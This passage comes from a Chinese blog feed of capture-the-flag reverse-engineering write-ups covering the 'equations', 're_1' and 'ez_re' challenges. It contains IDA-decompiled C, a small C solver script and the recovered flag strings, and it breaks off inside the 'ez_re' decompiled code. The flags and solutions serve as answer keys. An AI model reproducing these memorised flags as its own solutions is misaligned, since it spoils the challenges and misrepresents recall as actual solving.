    </entry>
    
    
    
    <entry>
      <title>某不知名网站题目</title>
      <link href="2021/03/02/%E6%9F%90%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%BD%91%E7%AB%99%E9%A2%98%E7%9B%AE/"/>
      <url>2021/03/02/%E6%9F%90%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%BD%91%E7%AB%99%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="equations"><a href="#equations" class="headerlink" title="equations"></a>equations</h1><a id="more"></a><p><a href="https://pan.baidu.com/s/1NK0Gtr3oqlk2Jn2mgasROQ">附件链接</a> 提取码：0000<br>题目翻译城中文为方程组<br>放入ida64中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">234923  89 30 21 11 28 97 68 91 36 29 54 38 18 31 27 25 42 93 45 89 80 94 57 68 59 75 74 </span><br><span class="line">47 40 25 68 52 86 81 38 23 90 80 54 66 80 36</span><br><span class="line">233479  65 11 81 65 58 53 86 44 62 39 64 41 93 67 34 30 25 45 76 17 91 47 57 82 26 17 94 </span><br><span class="line">51 21 80 59 26 75 75 25 67 52 23 81 57 79 98</span><br><span class="line">231388  63 83 55 29 57 53 31 99 27 92 85 98 63 80 18 78 79 28 96 16 95 27 25 71 40 89 79 </span><br><span class="line">81 13 85 41 44 50 55 11 32 76 65 20 37 58 27</span><br><span class="line">223405  39 69 44 25 49 15 16 96 35 32 92 95 11 58 31 90 67 72 83 78 15 25 93 96 97 31 58 </span><br><span class="line">59 14 86 36 37 22 75 43 72 13 26 18 64 64 83</span><br><span class="line">234762  94 82 88 51 31 71 44 74 26 46 95 66 54 75 19 72 93 16 85 54 46 87 15 46 74 27 26 </span><br><span class="line">48 83 13 38 94 45 52 24 72 59 71 32 65 24 93</span><br><span class="line">242484  34 75 68 93 79 19 14 76 60 69 73 29 48 61 49 64 98 29 77 81 85 11 87 11 72 63 87 </span><br><span class="line">40 47 48 87 54 88 27 26 67 93 50 79 42 12 32</span><br><span class="line">232356  76 61 21 72 11 93 13 63 15 13 73 49 48 76 52 81 62 78 84 79 95 74 57 21 13 95 15 </span><br><span class="line">93 57 38 89 98 68 69 21 40 20 55 62 29 54 40</span><br><span class="line">239858  98 66 92 23 97 55 72 69 81 41 38 21 56 95 86 39 78 53 65 37 80 56 38 60 94 72 20 </span><br><span class="line">43 50 28 81 63 12 60 32 12 22 86 65 32 76 71</span><br><span class="line">218896  32 15 73 84 27 21 74 21 35 26 85 28 57 91 37 12 67 47 10 74 62 53 73 84 94 46 74 </span><br><span class="line">47 57 40 88 71 13 32 81 95 57 28 13 94 45 34</span><br><span class="line">249026  50 47 34 57 12 34 76 54 79 18 44 73 50 92 51 72 39 91 26 74 97 42 86 79 53 50 62 </span><br><span class="line">14 71 55 87 64 77 62 63 48 27 81 93 85 65 83</span><br><span class="line">222855  92 26 78 74 25 38 64 98 68 71 14 99 92 11 31 29 20 52 17 10 21 37 99 52 66 32 57 </span><br><span class="line">58 25 25 93 54 96 70 18 66 84 27 44 28 52 83</span><br><span class="line">210754  53 39 23 68 62 44 98 17 80 16 63 51 15 49 84 23 97 26 65 35 11 83 43 64 21 39 37 </span><br><span class="line">79 73 61 55 57 58 69 16 10 48 86 80 13 67 32</span><br><span class="line">261049  12 69 82 77 95 22 21 85 79 58 48 83 47 77 64 80 56 35 78 67 46 93 51 75 69 62 44 </span><br><span class="line">11 46 98 37 93 34 53 87 46 85 79 69 81 45 86</span><br><span class="line">254017  51 74 62 62 86 10 49 94 65 50 62 95 48 66 14 84 61 41 89 78 46 60 20 97 32 65 61 </span><br><span class="line">78 57 16 64 97 81 81 76 61 27 46 99 64 35 99</span><br><span class="line">202040  15 47 16 70 28 32 65 82 53 32 29 25 69 96 52 76 22 41 82 91 47 24 55 40 18 19 52 </span><br><span class="line">83 37 51 89 37 27 55 40 82 61 27 26 28 30 73</span><br><span class="line">213614  11 29 51 69 81 96 58 97 36 81 18 62 73 32 72 11 49 61 69 67 54 30 10 70 42 27 19 </span><br><span class="line">11 97 83 27 40 63 12 41 21 84 74 22 19 65 79</span><br><span class="line">246738  76 64 47 17 80 57 93 11 79 98 56 86 23 67 63 11 54 72 80 44 50 61 14 43 80 48 63 </span><br><span class="line">52 99 79 40 64 49 55 52 78 48 60 44 32 85 98</span><br><span class="line">204859  77 34 26 66 87 76 58 39 81 60 83 23 16 62 33 36 85 40 64 78 22 11 81 81 27 12 11 </span><br><span class="line">41 15 19 69 20 26 66 17 87 50 67 47 21 31 81</span><br><span class="line">248644  56 66 51 80 33 73 76 42 13 91 75 90 82 20 15 99 33 18 22 28 39 17 74 54 78 47 61 </span><br><span class="line">68 73 95 60 52 84 11 78 67 82 79 31 94 78 74</span><br><span class="line">227559  24 15 63 20 81 71 50 77 98 71 98 43 57 10 66 53 36 45 44 54 90 22 96 68 98 27 71 </span><br><span class="line">78 37 43 20 50 82 84 19 76 59 27 47 31 19 31</span><br><span class="line">215120  45 66 23 77 41 65 99 35 67 29 63 77 55 36 27 63 43 70 55 11 28 17 77 90 28 57 62 </span><br><span class="line">98 84 96 36 43 30 73 32 25 34 14 91 18 73 26</span><br><span class="line">218244  65 25 41 22 34 46 91 70 35 22 65 60 96 58 76 80 21 62 59 70 51 50 39 14 31 39 79 </span><br><span class="line">49 45 82 74 35 56 24 93 47 32 41 14 15 71 51</span><br><span class="line">229321  45 99 29 14 89 72 48 43 92 10 94 13 33 94 59 22 65 29 23 86 67 83 28 46 83 89 48 </span><br><span class="line">59 28 38 82 32 70 50 28 39 24 60 17 37 60 90</span><br><span class="line">233372  62 66 17 38 19 83 12 98 61 57 63 67 69 10 24 75 60 87 76 37 91 35 20 30 24 77 29 </span><br><span class="line">27 40 36 98 82 20 67 45 96 99 80 17 55 74 55</span><br><span class="line">251643  64 68 36 79 23 96 16 40 79 16 85 77 99 56 95 99 60 28 11 96 22 66 47 66 90 48 80 </span><br><span class="line">34 22 47 66 80 37 43 75 84 23 21 39 85 64 95</span><br><span class="line">245051  14 55 61 90 62 91 24 31 40 34 88 59 65 26 16 28 36 33 81 91 99 57 69 75 32 98 17 </span><br><span class="line">60 94 16 89 51 35 74 87 98 52 39 73 41 65 65</span><br><span class="line">228339  58 64 96 49 96 43 13 28 42 90 80 33 68 62 42 78 75 56 20 66 45 63 10 72 41 63 28 </span><br><span class="line">42 60 26 76 20 98 19 51 68 80 12 48 68 80 15</span><br><span class="line">271672  93 74 76 39 79 99 22 66 47 40 85 58 50 56 84 93 65 65 56 66 95 32 84 48 51 68 30 </span><br><span class="line">96 93 60 83 79 54 61 99 77 12 51 31 93 54 12</span><br><span class="line">207826  30 29 52 29 91 81 31 28 75 84 10 40 14 34 26 70 94 74 27 38 55 13 21 55 79 94 45 </span><br><span class="line">41 39 62 56 25 10 54 61 58 23 97 95 70 18 62</span><br><span class="line">208076  19 60 27 79 53 21 21 47 52 26 42 82 20 87 74 57 88 22 67 95 69 24 50 14 31 26 38 </span><br><span class="line">40 31 46 17 67 85 54 33 46 43 72 84 94 67 29</span><br><span class="line">230168  37 52 47 30 99 11 20 20 41 72 46 78 97 93 47 73 48 35 85 99 77 49 48 75 94 44 29 </span><br><span class="line">11 18 71 82 88 27 70 95 26 19 73 61 51 55 51</span><br><span class="line">195444  92 21 36 77 36 27 25 45 48 16 73 90 71 53 47 39 75 33 96 11 22 18 15 48 20 16 90 </span><br><span class="line">50 66 11 49 91 23 60 81 53 57 18 19 40 54 48</span><br><span class="line">233025  47 22 61 36 88 58 42 13 69 33 89 93 93 75 31 98 65 94 77 16 14 99 21 89 90 37 27 </span><br><span class="line">11 22 80 66 65 31 70 76 29 49 92 51 38 27 47</span><br><span class="line">224202  69 33 97 97 51 59 15 17 92 59 84 19 33 54 78 15 50 28 40 68 75 23 55 38 69 46 21 </span><br><span class="line">39 36 74 84 90 31 57 81 21 46 66 63 23 43 82</span><br><span class="line">246170  26 52 48 41 14 64 11 31 90 49 93 92 45 56 99 85 81 26 34 27 55 55 85 26 41 83 41 </span><br><span class="line">46 89 41 66 96 92 16 47 73 59 85 57 88 70 49</span><br><span class="line">223337  26 74 51 31 10 55 23 33 62 97 93 71 96 89 28 35 63 26 66 12 83 67 39 72 92 78 70 </span><br><span class="line">19 63 76 74 70 84 31 18 22 54 74 32 30 65 15</span><br><span class="line">244180  88 20 28 71 54 74 73 90 12 35 49 94 69 20 18 88 80 88 73 65 19 40 23 17 21 48 71 </span><br><span class="line">89 96 61 92 81 74 36 78 16 81 39 43 12 80 91</span><br><span class="line">241027  30 64 16 36 85 58 43 97 90 85 79 28 28 86 24 40 43 22 95 74 73 29 35 13 82 67 77 </span><br><span class="line">76 19 70 29 61 92 51 82 98 40 83 72 33 81 41</span><br><span class="line">225646  55 16 69 49 35 88 71 14 64 16 23 34 81 89 66 79 20 40 11 10 52 74 55 26 64 30 97 </span><br><span class="line">65 51 88 55 59 20 18 97 86 65 28 44 71 64 93</span><br><span class="line">217174  48 91 36 87 35 11 40 67 90 25 39 85 29 97 57 44 99 88 34 83 75 10 73 63 44 63 56 </span><br><span class="line">17 94 16 28 78 55 63 19 22 37 36 42 16 49 51</span><br><span class="line">222271  51 55 27 49 54 89 77 58 15 36 25 43 71 57 78 55 54 58 28 79 87 92 39 88 61 11 27 </span><br><span class="line">66 59 96 79 75 69 25 16 40 68 30 16 12 51 48</span><br><span class="line">203973  71 29 57 59 30 75 67 39 95 14 48 49 35 93 56 94 14 59 12 49 19 40 16 86 79 38 31 </span><br><span class="line">43 82 14 51 85 85 19 99 35 30 19 26 15 32 77</span><br></pre></td></tr></table></figure><p>最终结果转换成字符串即可。</p><blockquote><p>flag{nO_w@y_y0u_woRk_ou7_mY_equ4tions_5et}</p></blockquote><h1 id="re-1"><a href="#re-1" class="headerlink" title="re_1"></a>re_1</h1><p><a href="https://pan.baidu.com/s/1VidIkvouV3V1GUSc79yMFQ">附件链接</a> 提取码：0000<br>ida64打开，进入main函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  void **v3; &#x2F;&#x2F; rdx</span><br><span class="line">  void *v5; &#x2F;&#x2F; [rsp+40h] [rbp-330h]</span><br><span class="line">  void *v6; &#x2F;&#x2F; [rsp+48h] [rbp-328h]</span><br><span class="line">  void *v7; &#x2F;&#x2F; [rsp+50h] [rbp-320h]</span><br><span class="line">  void *v8; &#x2F;&#x2F; [rsp+58h] [rbp-318h]</span><br><span class="line">  void *v9; &#x2F;&#x2F; [rsp+60h] [rbp-310h]</span><br><span class="line">  void *v10; &#x2F;&#x2F; [rsp+68h] [rbp-308h]</span><br><span class="line">  void *v11; &#x2F;&#x2F; [rsp+70h] [rbp-300h]</span><br><span class="line">  void *v12; &#x2F;&#x2F; [rsp+78h] [rbp-2F8h]</span><br><span class="line">  void *v13; &#x2F;&#x2F; [rsp+80h] [rbp-2F0h]</span><br><span class="line">  void *v14; &#x2F;&#x2F; [rsp+88h] [rbp-2E8h]</span><br><span class="line">  void *v15; &#x2F;&#x2F; [rsp+90h] [rbp-2E0h]</span><br><span class="line">  void *v16; &#x2F;&#x2F; [rsp+98h] [rbp-2D8h]</span><br><span class="line">  void *v17; &#x2F;&#x2F; [rsp+A0h] [rbp-2D0h]</span><br><span class="line">  void *v18; &#x2F;&#x2F; [rsp+A8h] [rbp-2C8h]</span><br><span class="line">  void *v19; &#x2F;&#x2F; [rsp+B0h] [rbp-2C0h]</span><br><span class="line">  void *v20; &#x2F;&#x2F; [rsp+B8h] [rbp-2B8h]</span><br><span class="line">  void *v21; &#x2F;&#x2F; [rsp+C0h] [rbp-2B0h]</span><br><span class="line">  void *v22; &#x2F;&#x2F; [rsp+C8h] [rbp-2A8h]</span><br><span class="line">  void *v23; &#x2F;&#x2F; [rsp+D0h] [rbp-2A0h]</span><br><span class="line">  void *v24; &#x2F;&#x2F; [rsp+D8h] [rbp-298h]</span><br><span class="line">  void *v25; &#x2F;&#x2F; [rsp+E0h] [rbp-290h]</span><br><span class="line">  void *v26; &#x2F;&#x2F; [rsp+E8h] [rbp-288h]</span><br><span class="line">  void *v27; &#x2F;&#x2F; [rsp+F0h] [rbp-280h]</span><br><span class="line">  void *v28; &#x2F;&#x2F; [rsp+F8h] [rbp-278h]</span><br><span class="line">  void *v29; &#x2F;&#x2F; [rsp+100h] [rbp-270h]</span><br><span class="line">  void *v30; &#x2F;&#x2F; [rsp+108h] [rbp-268h]</span><br><span class="line">  void *v31; &#x2F;&#x2F; [rsp+110h] [rbp-260h]</span><br><span class="line">  void *v32; &#x2F;&#x2F; [rsp+118h] [rbp-258h]</span><br><span class="line">  void *v33; &#x2F;&#x2F; [rsp+120h] [rbp-250h]</span><br><span class="line">  void *v34; &#x2F;&#x2F; [rsp+128h] [rbp-248h]</span><br><span class="line">  void *v35; &#x2F;&#x2F; [rsp+130h] [rbp-240h]</span><br><span class="line">  void *v36; &#x2F;&#x2F; [rsp+138h] [rbp-238h]</span><br><span class="line">  void *v37; &#x2F;&#x2F; [rsp+140h] [rbp-230h]</span><br><span class="line">  void *v38; &#x2F;&#x2F; [rsp+148h] [rbp-228h]</span><br><span class="line">  void *v39; &#x2F;&#x2F; [rsp+150h] [rbp-220h]</span><br><span class="line">  void *v40; &#x2F;&#x2F; [rsp+158h] [rbp-218h]</span><br><span class="line">  void *v41; &#x2F;&#x2F; [rsp+160h] [rbp-210h]</span><br><span class="line">  void *v42; &#x2F;&#x2F; [rsp+168h] [rbp-208h]</span><br><span class="line">  void *v43; &#x2F;&#x2F; [rsp+170h] [rbp-200h]</span><br><span class="line">  void *v44; &#x2F;&#x2F; [rsp+178h] [rbp-1F8h]</span><br><span class="line">  int v45; &#x2F;&#x2F; [rsp+368h] [rbp-8h]</span><br><span class="line">  int i; &#x2F;&#x2F; [rsp+36Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; &amp;v5;</span><br><span class="line">  memset(&amp;v5, 0, 0x320uLL);</span><br><span class="line">  v5 &#x3D; &amp;unk_483004;</span><br><span class="line">  v6 &#x3D; &amp;unk_483007;</span><br><span class="line">  v7 &#x3D; &amp;unk_483004;</span><br><span class="line">  v8 &#x3D; &amp;unk_48300A;</span><br><span class="line">  v9 &#x3D; &amp;unk_48300D;</span><br><span class="line">  v10 &#x3D; &amp;unk_483010;</span><br><span class="line">  v11 &#x3D; &amp;unk_483013;</span><br><span class="line">  v12 &#x3D; &amp;unk_483016;</span><br><span class="line">  v13 &#x3D; &amp;unk_483019;</span><br><span class="line">  v14 &#x3D; &amp;unk_48301C;</span><br><span class="line">  v15 &#x3D; &amp;unk_48301F;</span><br><span class="line">  v16 &#x3D; &amp;unk_483022;</span><br><span class="line">  v17 &#x3D; &amp;unk_483022;</span><br><span class="line">  v18 &#x3D; &amp;unk_483022;</span><br><span class="line">  v19 &#x3D; &amp;unk_483025;</span><br><span class="line">  v20 &#x3D; &amp;unk_48300A;</span><br><span class="line">  v21 &#x3D; &amp;unk_483019;</span><br><span class="line">  v22 &#x3D; &amp;unk_483016;</span><br><span class="line">  v23 &#x3D; &amp;unk_483028;</span><br><span class="line">  v24 &#x3D; &amp;unk_48302B;</span><br><span class="line">  v25 &#x3D; &amp;unk_483010;</span><br><span class="line">  v26 &#x3D; &amp;unk_48302E;</span><br><span class="line">  v27 &#x3D; &amp;unk_48301F;</span><br><span class="line">  v28 &#x3D; &amp;unk_483031;</span><br><span class="line">  v29 &#x3D; &amp;unk_483010;</span><br><span class="line">  v30 &#x3D; &amp;unk_483034;</span><br><span class="line">  v31 &#x3D; &amp;unk_483034;</span><br><span class="line">  v32 &#x3D; &amp;unk_483022;</span><br><span class="line">  v33 &#x3D; &amp;unk_483025;</span><br><span class="line">  v34 &#x3D; &amp;unk_483034;</span><br><span class="line">  v35 &#x3D; &amp;unk_483025;</span><br><span class="line">  v36 &#x3D; &amp;unk_48300A;</span><br><span class="line">  v37 &#x3D; &amp;unk_48302B;</span><br><span class="line">  v38 &#x3D; &amp;unk_48302E;</span><br><span class="line">  v39 &#x3D; &amp;unk_483034;</span><br><span class="line">  v40 &#x3D; &amp;unk_48302B;</span><br><span class="line">  v41 &#x3D; &amp;unk_48302E;</span><br><span class="line">  v42 &#x3D; &amp;unk_483037;</span><br><span class="line">  v43 &#x3D; &amp;unk_48302B;</span><br><span class="line">  v44 &#x3D; &amp;unk_48303A;</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 39; ++i )</span><br><span class="line">    v45 &#x3D; fun(*(&amp;v5 + i));</span><br><span class="line">  system(&quot;pause&quot;, argv, v3);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 __fastcall fun(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  signed __int64 v2; &#x2F;&#x2F; [rsp+8h] [rbp-10h]</span><br><span class="line">  int v3; &#x2F;&#x2F; [rsp+10h] [rbp-8h]</span><br><span class="line">  int i; &#x2F;&#x2F; [rsp+14h] [rbp-4h]</span><br><span class="line">  v2 &#x3D; 0LL;</span><br><span class="line">  for ( i &#x3D; 0; *(i + a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *(i + a1) &gt; 47 &amp;&amp; *(i + a1) &lt;&#x3D; 57 )</span><br><span class="line">      v3 &#x3D; *(i + a1) - 48;</span><br><span class="line">    if ( *(i + a1) &gt; 96 &amp;&amp; *(i + a1) &lt;&#x3D; 122 )</span><br><span class="line">      v3 &#x3D; *(i + a1) - 87;</span><br><span class="line">    if ( *(i + a1) &gt; 64 &amp;&amp; *(i + a1) &lt;&#x3D; 90 )</span><br><span class="line">      v3 &#x3D; *(i + a1) - 55;</span><br><span class="line">    v2 &#x3D; 16 * v2 + v3;</span><br><span class="line">  &#125;</span><br><span class="line">  return v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一题除了有点废手就没什么了。<br>脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int a[80]&#x3D;&#123;0x37,0x33,0x37,0x39,0x37,0x33,0x36,0x33,0x37,0x34,0x36,0x36,0x37,0x62,0x37,0x37,</span><br><span class="line">    0x33,0x34,0x33,0x35,0x36,0x35,0x36,0x34,0x36,0x34,0x36,0x34,0x33,0x36,0x36,0x33,0x33,0x34,</span><br><span class="line">    0x33,0x37,0x36,0x31,0x33,0x39,0x36,0x36,0x33,0x38,0x36,0x35,0x33,0x32,0x36,0x36,0x33,0x31,</span><br><span class="line">    0x33,0x31,0x36,0x34,0x33,0x36,0x33,0x31,0x33,0x36,0x36,0x33,0x33,0x39,0x33,0x38,0x33,0x31,</span><br><span class="line">    0x33,0x39,0x33,0x38,0x36,0x32,0x33,0x39,0x37,0x64&#125;;</span><br><span class="line">    int flag[80];</span><br><span class="line">    int v3,v2&#x3D;0;</span><br><span class="line">    for(int i&#x3D;0;i&lt;80;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if ( a[i] &gt; 47 &amp;&amp; a[i] &lt;&#x3D; 57 )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 &#x3D; a[i] - 48;</span><br><span class="line">            a[i]&#x3D; v3;</span><br><span class="line">            flag[i]&#x3D;a[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        else if ( a[i] &gt; 96 &amp;&amp; a[i] &lt;&#x3D; 122 )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 &#x3D; a[i] - 87;</span><br><span class="line">            a[i]&#x3D; v3;</span><br><span class="line">            flag[i]&#x3D;a[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        else if ( a[i] &gt; 64 &amp;&amp; a[i] &lt;&#x3D; 90 )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 &#x3D; a[i] - 55;</span><br><span class="line">            a[i]&#x3D; v3;</span><br><span class="line">            flag[i]&#x3D;a[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            a[i]&#x3D; 0;</span><br><span class="line">            flag[i]&#x3D;a[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(int i&#x3D;0;i&lt;80;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(flag[i]!&#x3D; 0);</span><br><span class="line">        printf(&quot;%0x&quot;,flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着16进制字符串。</p><blockquote><p>sysctf{w45eddd6c47a9f8e2f11d616c98198b9}</p></blockquote><h1 id="ez-re"><a href="#ez-re" class="headerlink" title="ez_re"></a>ez_re</h1><p><a href="https://pan.baidu.com/s/14LzmZK_3QGRU-uN9IKaetg">附件链接</a> 提取码：0000<br>拖入ida中，查看main函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; &#x2F;&#x2F; rdx</span><br><span class="line">  int result; &#x2F;&#x2F; eax</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; rdx</span><br><span class="line">  char v6; &#x2F;&#x2F; [rsp+0h] [rbp-30h]</span><br><span class="line">  unsigned __int64 v7; &#x2F;&#x2F; [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v7 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;You got something good for me?\n&gt;&quot;, argv, envp);</span><br><span class="line">  _isoc99_scanf(&quot;%33s&quot;);</span><br><span class="line">  if ( j_strlen_ifunc(&amp;v6, &amp;v6) &#x3D;&#x3D; 33 )</span><br><span class="line">  &#123;</span><br><span class="line">    crypto(&amp;v6);</span><br><span class="line">    printf(&quot;checking...&quot;);</span><br><span class="line">    if ( check(&amp;v6) )</span><br><span class="line">      puts(&quot;Well done,h4cker!&quot;, &amp;v6, v5);</span><br><span class="line">    else</span><br><span class="line">      puts(&quot;O0ops....&quot;, &amp;v6, v5);</span><br><span class="line">    result &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;O0ops....&quot;, &amp;v6, v3);</span><br><span class="line">    result &#x3D; 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall crypto(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; &#x2F;&#x2F; rax</span><br><span class="line">  signed int v2; &#x2F;&#x2F; [rsp+10h] [rbp-8h]</span><br><span class="line">  signed int v3; &#x2F;&#x2F; [rsp+14h] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; 55;</span><br><span class="line">  v3 &#x3D; 0;</span><br><span class="line">  while ( v3 &lt;&#x3D; 32 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(v3 + a1) -&#x3D; 2;</span><br><span class="line">    result &#x3D; (v3 + a1);</span><br><span class="line">    *result 